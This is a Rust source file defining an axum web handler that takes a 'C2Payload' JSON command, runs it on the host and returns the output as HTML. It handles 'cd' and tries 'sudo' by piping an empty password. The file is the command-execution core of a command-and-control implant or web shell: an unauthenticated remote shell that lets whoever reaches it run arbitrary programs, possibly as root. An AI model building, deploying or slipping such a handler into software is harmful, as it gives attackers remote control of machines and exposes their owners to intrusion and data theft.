use crate::ShellState;
use axum::{response::Html, Extension, Json};
use serde::Deserialize;
use std::{
    io::Write,
    process::Stdio,
    sync::{Arc, Mutex},
};

#[derive(Deserialize)]
pub struct C2Payload {
    cmd: String,
}

pub async fn exec_cmd<'a>(
    Extension(ext): Extension<Arc<Mutex<ShellState>>>,
    Json(body): Json<C2Payload>,
) -> Html<String> {
    let mut cmdvec = body.cmd.split_whitespace();
    let cmd_bin_name = cmdvec.next().unwrap();

    let output = if cmd_bin_name == "cd" {
        ShellState::manage_path(&mut ext.lock().unwrap(), cmdvec.collect::<Vec<&str>>());
        "".to_string()
    } else {
        let output = if cmd_bin_name == "sudo" {
            let mut child = std::process::Command::new(cmd_bin_name)
                .arg("-S")
                .args(cmdvec.collect::<Vec<&str>>())
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .current_dir(&ext.lock().unwrap().pwd)
                .spawn()
                .unwrap();
            writeln!(child.stdin.as_mut().unwrap(), "{}", "").unwrap();
            child.wait_with_output()
        } else {
            std::process::Command::new(cmd_bin_name)
                .args(cmdvec.collect::<Vec<&str>>())
                .current_dir(&ext.lock().unwrap().pwd)
                .output()
        };

        match output {
            Ok(op) => format!(
                "{}\n{}",
                String::from_utf8(op.stdout).unwrap(),
                String::from_utf8(op.stderr).unwrap()
            ),
            Err(_) => String::from("Error: Command not found"),
        }
    };

    Html(output)
}
